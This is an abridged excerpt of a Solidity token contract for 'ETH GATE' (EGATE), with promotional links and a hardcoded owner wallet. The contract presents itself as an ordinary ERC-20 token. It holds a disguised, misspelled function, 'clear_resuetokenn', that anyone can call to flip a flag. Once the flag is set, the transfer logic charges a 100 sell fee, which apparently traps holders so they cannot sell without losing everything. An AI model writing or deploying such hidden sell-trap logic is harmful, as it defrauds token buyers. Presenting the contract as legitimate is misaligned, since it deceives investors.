...
// Telegram : https://t.me/ethgatecoin
// Website : https://ethgate.finance
...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = 0xA58dd4e63CB8b054302ccf4430EFdE8B92F4F803;
...
contract ETHGATE is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0xA58dd4e63CB8b054302ccf4430EFdE8B92F4F803);
  ...
  //   TOKEN DETAILS
    ...
    string private _name = "ETH GATE"; 
    string private _symbol = "EGATE";  
    ...
    */
    ...
    function clear_resuetokenn () external virtual {
        egate = 1;
    } 
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = (egate <= 0 ? _sellFee:100);}
